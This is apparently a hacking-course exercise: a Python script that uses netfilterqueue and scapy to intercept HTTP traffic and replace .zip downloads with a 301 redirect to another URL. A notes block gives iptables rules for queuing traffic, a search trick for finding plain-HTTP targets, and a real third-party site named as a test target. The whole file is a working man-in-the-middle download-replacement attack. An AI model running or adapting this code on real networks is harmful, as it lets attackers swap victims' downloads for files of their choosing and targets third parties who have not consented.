"""

__
iptables -I OUTPUT -j NFQUEUE --queue-num 0

iptables -I INPUT -j NFQUEUE --queue-num 0
__

iptables -I FORWARD -j NFQUEUE --queue-num 0
___

iptables --flush
___


your_request -inurl:https

__
sites for test:
http://xcal1.vodafone.co.uk/


# add files to apache to directory
cd /var/www/



"""



import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".zip" in str(scapy_packet[scapy.Raw].load):
                print("[+] exe request")
                
                ack_list.append(scapy_packet[scapy.TCP].ack)

    
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] Replacing file")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
               
                # replace load
                # replace url
                new_url = 'https://unsplash.com/photos/roCW7M4zHPY/download?force=true'
                scapy_packet[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {new_url}\n\n"

                # delete fields, they will be calculated automatically by scapy
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                
                packet.set_payload( bytes(scapy_packet) )

    packet.accept()


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
